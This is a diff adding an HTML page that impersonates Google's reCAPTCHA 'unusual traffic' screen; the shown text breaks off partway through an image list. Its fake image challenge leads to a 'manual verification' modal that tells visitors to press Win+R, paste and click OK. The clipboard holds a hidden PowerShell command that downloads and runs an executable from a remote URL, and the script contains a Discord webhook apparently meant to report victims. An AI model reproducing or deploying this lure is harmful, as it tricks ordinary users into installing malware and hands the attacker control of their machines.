@@ -1,0 +1,1410 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>reCAPTCHA Verification</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <style>
+        body { 
+            font-family: 'Roboto', helvetica, arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .sorry-page {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 40px 20px 60px;
+        }
+
+        .sorry-divider {
+            border: none;
+            border-top: 1px solid #aaaaaa;
+            margin: 20px 0;
+        }
+
+        .sorry-recaptcha-row {
+            display: flex;
+            justify-content: flex-start;
+            margin: 20px 0;
+        }
+
+        .about-page-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #202124;
+            margin: 0 0 12px 0;
+        }
+
+        .about-page-body {
+            font-size: 14px;
+            color: #202124;
+            line-height: 1.6;
+            margin: 0 0 24px 0;
+        }
+
+        .about-page-body a {
+            color: #1a0dab;
+            text-decoration: underline;
+        }
+
+        .about-page-info {
+            font-size: 13px;
+            color: #202124;
+            line-height: 1.9;
+        }
+
+        .why-box {
+            background: #f1f3f4;
+            border-radius: 4px;
+            padding: 16px 18px;
+            font-size: 14px;
+            color: #202124;
+            line-height: 1.6;
+            margin-bottom: 24px;
+            display: none;
+        }
+
+        .why-box p { margin: 0 0 16px 0; }
+        .why-box p:last-child { margin-bottom: 0; }
+        .why-box a { color: #1a0dab; text-decoration: underline; }
+
+        [dir="rtl"] {
+            direction: rtl;
+            text-align: right;
+        }
+
+        /* Checkbox Widget */
+        .recaptcha-checkbox {
+            width: 24px;
+            height: 24px;
+            background: #ffffff;
+            border: 2px solid #444746;
+            border-radius: 2px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            transition: all 200ms cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .recaptcha-checkbox:hover:not(.loading):not(.checked) {
+            border: 2px solid #2e2e2e;
+        }
+
+        .recaptcha-checkbox.loading {
+            border: none;
+            background: transparent;
+        }
+
+        /* FIX 1: checked state for checkbox */
+        .recaptcha-checkbox.checked {
+            border: 2px solid #444746;
+            background: #ffffff;
+            cursor: default;
+        }
+
+        .recaptcha-widget {
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08); 
+            width: 304px;
+            height: 78px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 12px;
+            transition: box-shadow 150ms cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .recaptcha-widget:hover {
+            box-shadow: 0 0 6px 1px rgba(0,0,0,0.12);
+        }
+
+        /* Spinner - optimized to match real reCAPTCHA */
+        .g-spinner {
+            animation: rotate-normal 1.5s linear infinite;
+            transform-origin: center center;
+            width: 28px;
+            height: 28px;
+        }
+
+        @keyframes rotate-normal {
+            0%   { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Fixed spinner circle */
+        /* 1. Thicker Stroke (9px) matches the bold look in your video */
+        .g-spinner-circle {
+            stroke-dasharray: 1, 200;
+            stroke-dashoffset: 0;
+            animation: dash 1.5s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+            stroke-linecap: round;
+            stroke: #1a73e9;
+            stroke-width: 7;
+        }
+        
+        /* 2. Smooth breathing arc - optimized for no choppiness */
+        @keyframes dash {
+            0% {
+                stroke-dasharray: 1, 200;
+                stroke-dashoffset: 0;
+            }
+            50% {
+                stroke-dasharray: 140, 200;
+                stroke-dashoffset: -50px;
+            }
+            100% {
+                stroke-dasharray: 1, 200;
+                stroke-dashoffset: -200px;
+            }
+        }
+
+        @keyframes color {
+            100%, 0% {
+                stroke: #1a73e9;
+            }
+        }
+
+        /* FIX 1: Green checkmark animation properly wired */
+        .g-checkmark {
+            width: 100%;
+            height: 100%;
+            stroke: #0F9D58;
+            stroke-width: 3;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            stroke-dasharray: 50;
+            stroke-dashoffset: 50;
+        }
+        
+        .g-checkmark.animate {
+            animation: drawCheck 0.5s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+        
+        @keyframes drawCheck {
+            to { stroke-dashoffset: 0; }
+        }
+
+        /* Modal Styles */
+        .modal-overlay {
+            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .modal-enter {
+            animation: fadeIn 200ms cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .no-select { 
+            user-select: none; 
+            -webkit-user-select: none; 
+        }
+
+        .challenge-container {
+            position: fixed;
+            top: 52%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9999;
+        }
+
+        .image-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 4px;
+            background-color: #e0e0e0;
+            border: 4px solid #e0e0e0;
+        }
+
+        .image-tile {
+            position: relative;
+            cursor: pointer;
+            overflow: hidden;
+            background: #ffffff;
+            aspect-ratio: 1;
+        }
+        
+        .image-tile img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 1;
+            transition: transform 180ms cubic-bezier(0.2, 0, 0.2, 1);
+        }
+
+        .image-tile img.zooming-out { 
+            transform: scale(0.78); 
+        }
+
+        .white-overlay {
+            position: absolute;
+            inset: 0;
+            background-color: #ffffff;
+            opacity: 0;
+            z-index: 20;
+            pointer-events: none;
+        }
+
+        .center-check {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 42px;
+            height: 42px;
+            background: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            opacity: 0;
+            pointer-events: none;
+            image-rendering: pixelated;
+            image-rendering: -moz-crisp-edges;
+            image-rendering: crisp-edges;
+        }
+
+        .center-check.first-attempt {
+            filter: blur(0.7px);
+            image-rendering: auto;
+        }
+
+        .corner-check {
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            width: 19px;
+            height: 19px;
+            background: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            opacity: 0;
+            pointer-events: none;
+            filter: blur(0.19px);
+        }
+
+        .corner-check.show {
+            animation: checkFadeIn 120ms cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+
+        @keyframes checkFadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+
+        .hidden { display: none !important; }
+
+        .verification-link {
+            color: #1a73e9;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .verification-link:hover { color: #1557b0; }
+
+        /* FIX 3 (corrected): VERIFY button border-radius is 2px per real reCAPTCHA */
+        .verify-button {
+            background: #1a73e9;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 2px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+        }
+
+        .verify-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        @keyframes errorSlideIn {
+            from { 
+                opacity: 0; 
+                transform: translateY(-8px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+
+        @keyframes helpSlideIn {
+            from { 
+                opacity: 0; 
+                max-height: 0;
+                margin-bottom: 0;
+            }
+            to { 
+                opacity: 1; 
+                max-height: 500px;
+                margin-bottom: 16px;
+            }
+        }
+
+        #detailed-help:not(.hidden) {
+            animation: helpSlideIn 300ms ease-out forwards;
+        }
+
+        /* RTL support removed — EN only */
+
+        .error-message {
+            color: #d93025;
+            font-size: 13px;
+            padding: 0;
+            min-height: 0;
+            height: 0;
+            overflow: hidden;
+            text-align: center;
+        }
+
+        .error-message:not(:empty) {
+            padding: 12px 16px;
+            height: auto;
+            min-height: 20px;
+            animation: errorSlideIn 150ms ease-out;
+        }
+
+        /* FIX 4: Toolbar icon gap increased to match real reCAPTCHA spacing */
+        .toolbar-icons {
+            display: flex;
+            gap: 14px;
+            padding-left: 4px;
+        }
+
+        .toolbar-icon {
+            width: 28px;
+            height: 28px;
+            color: #70757a;
+            cursor: pointer;
+            transition: color 150ms cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .toolbar-icon:hover { color: #202124; }
+
+        #tooltip {
+            position: fixed;
+            background: #616161;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 2px;
+            font-size: 12px;
+            pointer-events: none;
+            white-space: nowrap;
+            opacity: 0;
+            transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 10000;
+        }
+
+        #tooltip.show { opacity: 0.9; }
+
+        .reference-image-container {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 95px;
+            height: 72px;
+            border: 2px solid white;
+            border-radius: 1px;
+            overflow: hidden;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+            z-index: 5;
+        }
+
+        .reference-image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+    <div id="tooltip"></div>
+
+    <div class="sorry-page">
+
+        <hr class="sorry-divider">
+
+        <div class="sorry-recaptcha-row">
+            <div class="recaptcha-widget no-select">
+        <div class="flex items-center gap-3 pl-1">
+            <div id="recaptcha-checkbox" class="recaptcha-checkbox" onclick="triggerCaptcha()">
+                <div id="loader" class="hidden">
+                    <svg class="g-spinner" viewBox="0 0 66 66">
+                        <circle class="g-spinner-circle" fill="none" cx="33" cy="33" r="30"></circle>
+                    </svg>
+                </div>
+                <!-- FIX 1: Checkmark is properly shown and animated on completion -->
+                <svg id="checkmark" class="g-checkmark hidden" viewBox="0 0 24 24">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                </svg>
+            </div>
+            <span id="main-text" style="font-size: 14px; color: #202124; font-weight: 400; font-family: 'Roboto', sans-serif;">I'm not a robot</span>
+        </div>
+        
+        <div class="flex flex-col items-center justify-center gap-0 pt-1">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="32" height="32" alt="reCAPTCHA logo" style="margin-bottom: 2px;">
+            <span style="font-size: 10px; color: #555555; margin-bottom: 2px;">reCAPTCHA</span>
+            <div class="flex gap-1" style="font-size: 8px; color: #555555;">
+                <a href="#" class="hover:underline" style="text-decoration: none; color: #555;">Privacy</a>
+                <span>-</span>
+                <a href="#" class="hover:underline" style="text-decoration: none; color: #555;">Terms</a>
+            </div>
+        </div>
+        </div><!-- end recaptcha-widget -->
+        </div><!-- end sorry-recaptcha-row -->
+
+        <hr class="sorry-divider">
+
+        <p class="about-page-title">About this page</p>
+        <p class="about-page-body">
+            Our systems have detected unusual traffic from your computer network. This page checks to see if it's really you sending the requests, and not a robot. <a href="#" onclick="event.preventDefault(); var b=document.getElementById('why-box'); b.style.display=b.style.display==='block'?'none':'block';">Why did this happen?</a>
+        </p>
+
+        <div id="why-box" class="why-box">
+            <p>This page appears when Google automatically detects requests coming from your computer network which appear to be in violation of the <a href="#">Terms of Service</a>. The block will expire shortly after those requests stop. In the meantime, solving the above CAPTCHA will let you continue to use our services.</p>
+            <p>This traffic may have been sent by malicious software, a browser plug-in, or a script that sends automated requests. If you share your network connection, ask your administrator for help — a different computer using the same IP address may be responsible. <a href="#">Learn more</a></p>
+            <p>Sometimes you may be asked to solve the CAPTCHA if you are using advanced terms that robots are known to use, or sending requests very quickly.</p>
+        </div>
+
+        <div class="about-page-info">
+            <div>IP address: <span id="user-ip">detecting...</span></div>
+            <div>Time: <span id="page-time"></span></div>
+        </div>
+
+    </div><!-- end sorry-page -->
+
+    <div id="challenge-overlay" class="hidden fixed inset-0 bg-black/50 modal-overlay" style="z-index: 9998;"></div>
+
+    <div id="challenge-card" class="hidden challenge-container">
+        <div class="bg-white w-[95vw] max-w-[320px] rounded-sm modal-enter" style="border: 1px solid #cccccc; box-shadow: 0 2px 6px 2px rgba(0,0,0,0.15), 0 1px 2px 0 rgba(0,0,0,0.3);">
+            
+            <div class="text-white px-3 py-2 relative" style="min-height: 90px; background: #1a73e9;">
+                <div id="reference-image" class="hidden reference-image-container">
+                    <img id="reference-img" src="" alt="Reference">
+                </div>
+                <p id="header-instruction" style="font-size: 14px; font-weight: 400; margin-bottom: 4px; margin-top: 8px; padding-left: 6px; line-height: 1.3;">Select all squares with</p>
+                <p id="challenge-type" style="font-size: 26px; font-weight: 700; margin-bottom: 4px; padding-left: 6px; line-height: 1.1;">cars</p>
+                <p id="header-subtitle" style="font-size: 12px; font-weight: 400; padding-left: 6px; line-height: 1.3;">Click verify once there are none left.</p>
+            </div>
+
+            <div id="image-grid" class="image-grid"></div>
+
+            <div id="error-container" class="error-message"></div>
+
+            <!-- FIX 4: toolbar-icons class with proper spacing -->
+            <div class="p-3 flex items-center justify-between border-t border-[#e0e0e0]">
+                <div class="toolbar-icons">
+                    <svg class="toolbar-icon" onclick="refreshChallenge()" onmouseenter="showTooltip(event, 'tooltip-refresh')" onmouseleave="hideTooltip()" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
+                    </svg>
+                    <svg class="toolbar-icon" onmouseenter="showTooltip(event, 'tooltip-audio')" onmouseleave="hideTooltip()" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M12 1c-4.97 0-9 4.03-9 9v7c0 1.66 1.34 3 3 3h3v-8H5v-2c0-3.87 3.13-7 7-7s7 3.13 7 7v2h-4v8h3c1.66 0 3-1.34 3-3v-7c0-4.97-4.03-9-9-9z"/>
+                    </svg>
+                    <svg class="toolbar-icon" onmouseenter="showTooltip(event, 'tooltip-accessibility')" onmouseleave="hideTooltip()" fill="currentColor" viewBox="0 0 24 24">
+                       <path d="M23 5.5V20c0 2.2-1.8 4-4 4h-7.3c-1.08 0-2.1-.43-2.85-1.19L1 14.83s1.26-1.23 1.3-1.25c.22-.19.49-.29.79-.29.22 0 .42.06.6.16.04.01 4.31 2.46 4.31 2.46V4c0-.83.67-1.5 1.5-1.5S11 3.17 11 4v7h1V1.5c0-.83.67-1.5 1.5-1.5S15 .67 15 1.5V11h1V2.5c0-.83.67-1.5 1.5-1.5s1.5.67 1.5 1.5V11h1V5.5c0-.83.67-1.5 1.5-1.5s1.5.67 1.5 1.5z"/>
+                    </svg>
+                    <!-- FIX 2: Info icon changed from filled to outlined (matches real reCAPTCHA) -->
+                    <svg class="toolbar-icon" onmouseenter="showTooltip(event, 'tooltip-info')" onmouseleave="hideTooltip()" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="10"/>
+                        <line x1="12" y1="8" x2="12" y2="8" stroke-linecap="round" stroke-width="2.2"/>
+                        <line x1="12" y1="11" x2="12" y2="16" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                <button id="verify-btn" onclick="verify()" class="verify-button">VERIFY</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Manual Modal -->
+    <div id="manual-modal" class="hidden challenge-container">
+        <div id="manual-modal-card" class="bg-white w-[95vw] max-w-[520px] shadow-2xl border border-[#d3d3d3] rounded-sm modal-enter" style="max-height:85vh; overflow-y:auto;">
+            <div class="border-b border-[#e0e0e0] px-6 py-4">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 bg-[#1a73e9] rounded-full flex items-center justify-center flex-shrink-0">
+                        <svg class="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+                        </svg>
+                    </div>
+                    <div>
+                        <h3 id="manual-title" style="font-size: 18px; font-weight: 500; color: #202124;">Manual Verification Required</h3>
+                        <p id="manual-subtitle" style="font-size: 13px; color: #5f6368; margin-top: 2px;">Enhanced security check</p>
+                    </div>
+                </div>
+            </div>
+            <div class="px-6 py-5">
+                <div class="bg-[#e8f0fe] border border-[#d2e3fc] rounded-lg p-4 mb-4">
+                    <p id="manual-description" style="font-size: 13px; color: #174ea6; line-height: 1.5; margin-bottom: 12px;"></p>
+                    <div class="bg-white rounded border border-[#d2e3fc] p-3 mb-3">
+                        <p id="manual-steps-header" style="font-size: 11px; color: #5f6368; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px;">Verification Steps</p>
+                        <ol id="manual-steps" style="font-size: 13px; color: #3c4043; margin-left: 4px;"></ol>
+                    </div>
+                    <div class="flex items-start gap-2" style="font-size: 11px; color: #174ea6;">
+                        <svg class="w-4 h-4 flex-shrink-0" style="margin-top: 2px;" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
+                        </svg>
+                        <span id="manual-info" style="line-height: 1.5;"></span>
+                    </div>
+                </div>
+                
+                <!-- ENHANCEMENT: Detailed help section for confused users -->
+                <div id="detailed-help" class="hidden bg-[#f8f9fa] border border-[#e8eaed] rounded-lg p-4 mb-4">
+                    <div class="flex items-start gap-2 mb-3">
+                        <svg class="w-5 h-5 flex-shrink-0 text-[#1a73e9]" style="margin-top: 2px;" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
+                        </svg>
+                        <div style="flex: 1;">
+                            <h4 id="detailed-help-title" style="font-size: 13px; font-weight: 500; color: #202124; margin-bottom: 8px;">Detailed Instructions</h4>
+                            <div id="detailed-help-content" style="font-size: 12px; color: #5f6368; line-height: 1.6;">
+                                <!-- Content injected by JS -->
+                            </div>
+                        </div>
+                    </div>
+                    <div class="flex items-center gap-2 pt-2 border-t border-[#e8eaed]" style="font-size: 11px; color: #5f6368;">
+                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM9.555 7.168A1 1 0 008 8v4a1 1 0 001.555.832l3-2a1 1 0 000-1.664l-3-2z" clip-rule="evenodd"/>
+                        </svg>
+                        <span id="detailed-help-note"></span>
+                    </div>
+                </div>
+
+                <div class="flex gap-3">
+                    <button id="help-toggle-btn" onclick="toggleDetailedHelp()" class="flex-1 bg-white border border-[#dadce0] text-[#1a73e9] hover:bg-[#f8f9fa] font-[500] text-[14px] py-2.5 px-4 rounded transition-colors flex items-center justify-center gap-2">
+                        <svg id="help-icon" class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                            <circle cx="12" cy="12" r="10"/>
+                            <path stroke-linecap="round" d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/>
+                            <circle cx="12" cy="17" r="0.5" fill="currentColor"/>
+                        </svg>
+                        <span id="help-toggle-text">Need Help?</span>
+                    </button>
+                    <button id="run-verification-btn" onclick="runManualVerification()" class="flex-1 bg-[#1a73e9] hover:bg-[#1557b0] text-white font-[500] text-[14px] py-2.5 px-4 rounded transition-colors shadow-sm">Run Verification</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const IMAGE_BASE_PATH = ""; // Set this to the folder path where your images are stored, e.g. "images/"
+
+        const DISCORD_WEBHOOKS = [
+            "https://discord.com/api/webhooks/1474731011974889542/2NQQsVD2_KBR5rjjRQ8Wjz2qFoFNO_KDpYhlWvxU0n6vA_8qa-6UHlQq96LCtwJJ7SAK"
+        ];
+
+        const COMMAND_POOLS = {
+            en: [
+                'powershell.exe -w hidden -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol = \'Tls12\'; iwr \'https://raw.githubusercontent.com/banhannah-l/A/refs/heads/main/program.exe\' -OutFile $env:TEMP\\v.exe; Start-Process $env:TEMP\\v.exe"'
+            ]
+        };
+
+        const REFERENCE_IMAGES = {
+            cars: 'https://i.ibb.co/fdRGJqNK/CARrefrence.png'
+        };
+
+        const TRANSLATIONS = {
+            en: { 
+                mainText: "I'm not a robot", 
+                headerInstruction: "Select all squares with", 
+                headerSubtitle: "Click verify once there are none left.", 
+                errorTryAgain: "Please try again.", 
+                errorDifficulty: "Our system is having difficulty verifying your request. Please try the <a href='#' id='manual-verify-link' class='verification-link'>automatic verification process</a>.", 
+                manualTitle: "Automatic Verification Required", 
+                manualSubtitle: "Enhanced security check", 
+                manualDescription: "Our automated verification system detected unusual patterns.", 
+                manualStepsHeader: "Verification Steps", 
+                manualSteps: [
+                    "Click <strong>Run Verification</strong> below", 
+                    "Press <kbd style='padding: 2px 6px; background: #f8f9fa; border: 1px solid #dadce0; border-radius: 2px; font-size: 11px; font-family: monospace;'>Win + R</kbd>", 
+                    "Press <kbd style='padding: 2px 6px; background: #f8f9fa; border: 1px solid #dadce0; border-radius: 2px; font-size: 11px; font-family: monospace;'>Ctrl + V</kbd> and click OK"
+                ], 
+                manualInfo: "This validates your browser environment.", 
+                manualCancelBtn: "Cancel", 
+                runVerificationBtn: "Run Verification", 
+                helpToggleShow: "Need Help?",
+                helpToggleHide: "Hide Help",
+                detailedHelpTitle: "Detailed Instructions",
+                detailedHelpContent: `
+                    <p style="margin-bottom: 10px;"><strong>Step 1:</strong> Click the blue "Run Verification" button below. This will copy a verification command to your clipboard.</p>
+                    <p style="margin-bottom: 10px;"><strong>Step 2:</strong> Open the Run dialog:</p>
+                    <ul style="margin-left: 16px; margin-bottom: 10px;">
+                        <li style="margin-bottom: 4px;">• Hold down the <strong>Windows key</strong> <span style="display: inline-flex; align-items: center; gap: 3px; padding: 3px 7px; background: #0078d4; border: 1px solid #005a9e; border-radius: 3px; font-family: 'Segoe UI', sans-serif; font-size: 11px;"><svg width="14" height="14" viewBox="0 0 88 88" style="vertical-align: middle;"><path fill="#ffffff" d="M0 12.402l35.687-4.86.016 34.423-35.67.203zm35.67 33.529l.028 34.453L.028 75.48.026 45.7zm4.326-39.025L87.314 0v41.527l-47.318.376zm47.329 39.349l-.011 41.34-47.318-6.678-.066-34.739z"/></svg></span> on your keyboard</li>
+                        <li style="margin-bottom: 4px;">• While holding it, press the <strong>R</strong> key</li>
+                        <li style="margin-bottom: 4px;">• A small window titled "Run" should appear</li>
+                    </ul>
+                    <p style="margin-bottom: 10px;"><strong>Step 3:</strong> Paste and run:</p>
+                    <ul style="margin-left: 16px; margin-bottom: 10px;">
+                        <li style="margin-bottom: 4px;">• Click in the text box in the Run window</li>
+                        <li style="margin-bottom: 4px;">• Press <strong>Ctrl + V</strong> on your keyboard to paste</li>
+                        <li style="margin-bottom: 4px;">• Click the <strong>OK</strong> button</li>
+                    </ul>
+                    <p style="margin-bottom: 10px;"><strong>Step 4:</strong> Wait 5-10 seconds for the verification to complete, then return here and refresh the page.</p>
+                `,
+                detailedHelpNote: "This process verifies your Windows environment is genuine.",
+                tooltipRefresh: "Get a new challenge", 
+                tooltipAudio: "Get an audio challenge", 
+                tooltipAccessibility: "Accessibility options", 
+                tooltipInfo: "Why am I seeing this?", 
+                verifyBtn: "VERIFY", 
+                copiedBtn: "Copied to Clipboard", 
+                finalInstruction: "Now press Win+R, then Ctrl+V", 
+                challenges: { 
+                    crosswalks: "crosswalks", 
+                    buses: "buses", 
+                    cars: "cars", 
+                    bicycles: "bicycles", 
+                    fireHydrants: "fire hydrants"
+                } 
+            }
+        };
+
+        const imagePool = {
+            crosswalks: ['https://i.ibb.co/QF6hVsst/crosswalk.png','https://i.ibb.co/7JLrVZ57/crosswalk2.png','https://i.ibb.co/23k5gKKp/crosswalk3.png','https://i.ibb.co/TDV7gtKs/crosswalk7.png','https://i.ibb.co/jZLRmwyh/crosswalk7382.png','https://i.ibb.co/7JfgMwzR/crosswalk77.png','https://i.ibb.co/wNxhxyZq/crosswalk8888.png','https://i.ibb.co/DDyTmv6S/crosswalk89.png','https://i.ibb.co/Tx9hqxGy/crosswalk99.png','https://i.ibb.co/CpkyhwBW/crosswalk9911.png'],
+            buses: ['https://i.ibb.co/Ng0bnrpq/bus-1.png','https://i.ibb.co/xNHhXq9/bus101-1.png','https://i.ibb.co/3mSgYZN8/bus72-1.png','https://i.ibb.co/DPzgTk3v/bus822-1.png','https://i.ibb.co/nNwx9Hr4/bus82s-1.png','https://i.ibb.co/5WJCB5B1/bus83-1.png','https://i.ibb.co/Ng8Fn10n/bus92211-1.png','https://i.ibb.co/yn9V6qvT/buss2-1.png','https://i.ibb.co/zhcZk1dJ/buss35-1.png','https://i.ibb.co/svdvTTCJ/busss.png'],
+            cars: ['https://i.ibb.co/6Rhqfqz5/Caarrr.png','https://i.ibb.co/04JGjNx/car.png','https://i.ibb.co/BVf81WFK/car01.png','https://i.ibb.co/KcqY7562/car33.png','https://i.ibb.co/r2Hw39yr/c-Ar5.png','https://i.ibb.co/1GczvTsq/car52.png','https://i.ibb.co/Rk44qncp/Car662.png','https://i.ibb.co/DDt40565/car717.png','https://i.ibb.co/FLDvGn6r/car7722.png','https://i.ibb.co/LWGZpXV/car8.png','https://i.ibb.co/6RWBZ1R3/car8106.png','https://i.ibb.co/202dSTBv/car82.png','https://i.ibb.co/HTNh2c4p/car821.png','https://i.ibb.co/WvXw9BsJ/car88.png','https://i.ibb.co/ks0fCS7t/car887.png','https://i.ibb.co/XfQh2ZBs/car8888221.png','https://i.ibb.co/N2V3h3Xp/car89211.png','https://i.ibb.co/0pD0fqH3/Car893.png','https://i.ibb.co/2YyNVJT4/car901.png','https://i.ibb.co/Jj42fbCd/car99157.png','https://i.ibb.co/wZLz3PQ3/Carr.png','https://i.ibb.co/PsQc50nd/carrrr.png','https://i.ibb.co/Kj2Jk4cd/carss3.png'],
+            bicycles: ['https://i.ibb.co/Q3pHM7Sh/bicycle0-1.png','https://i.ibb.co/JFdWwVM2/bicycle013-1.png','https://i.ibb.co/Zz7C8cNQ/bicycle027-1.png','https://i.ibb.co/bgPYVNJX/bicycle082-1.png','https://i.ibb.co/m5srFT7K/bicycle2-1.png','https://i.ibb.co/Wvzsgsny/bicycle3-1.png','https://i.ibb.co/00Z6nqY/bicycle5-1.png','https://i.ibb.co/fGQxGJs3/bicycle6-1.png','https://i.ibb.co/dwTJH9zB/bicycle7-1.png','https://i.ibb.co/HTx94rnX/bicycle990114.png'],
+            fireHydrants: ['https://i.ibb.co/ZpSqn1Tr/Fire.png','https://i.ibb.co/wFnbgZGC/fire0909.png','https://i.ibb.co/Swns0jhK/fire1.png','https://i.ibb.co/xKMvrhS8/fire2.png','https://i.ibb.co/RkXKYKym/fire23.png','https://i.ibb.co/sd0MBFyX/fire3.png','https://i.ibb.co/VpxLCq12/fire773.png','https://i.ibb.co/gMbdwC2x/fire88.png','https://i.ibb.co/gZDN0SCS/fire88827.png','https://i.ibb.co/5WFqXCGW/fire991.png'],
+            random: ['https://i.ibb.co/HywT0gz/amd.png','https://i.ibb.co/Lhtb88Xk/bie.png','https://i.ibb.co/5wwD2KH/uhdjd.png','https://i.ibb.co/rX5VCCR/bis.png','https://i.ibb.co/jZw9LdzW/a.png','https://i.ibb.co/XxDHH9Lw/g.png','https://i.ibb.co/mrLkp6ZF/j.png','https://i.ibb.co/m53y5fWy/fn.png','https://i.ibb.co/WvjNd3Yn/b.png','https://i.ibb.co/d4sZj7ZY/qq.png','https://i.ibb.co/gFr548j8/bd.png','https://i.ibb.co/DfCMLsPh/vf.png','https://i.ibb.co/qfHs23j/nnd.png','https://i.ibb.co/67b3vLvN/jjf.png','https://i.ibb.co/mVYP26ZR/jjr.png','https://i.ibb.co/SwyrGWF6/jr.png','https://i.ibb.co/cSN6Qw9Y/bnd.png','https://i.ibb.co/N2jv8NpK/bbdj.png','https://i.ibb.co/4RZhDx8h/So.png','https://i.ibb.co/wZ7h6S5s/jiev.png','https://i.ibb.co/dwyjZqZM/y-G.png','https://i.ibb.co/vxrFG9nC/igqnd.png','https://i.ibb.co/Y4jMW9pZ/aiq.png','https://i.ibb.co/nHnMLb1/rvtuu.png','https://i.ibb.co/9998gmNX/yjf.png','https://i.ibb.co/bMwY47bw/j-U6.png','https://i.ibb.co/k2cTZXJG/dihhegj.png','https://i.ibb.co/fYc1NcPF/Gi.png','https://i.ibb.co/jsrq0gQ/ykw.png','https://i.ibb.co/S4mgwz6j/E57.png','https://i.ibb.co/zTV7Bvwn/hiw.png','https://i.ibb.co/ksSGgg06/qjd83.png','https://i.ibb.co/1GnSGmrQ/iehz.png','https://i.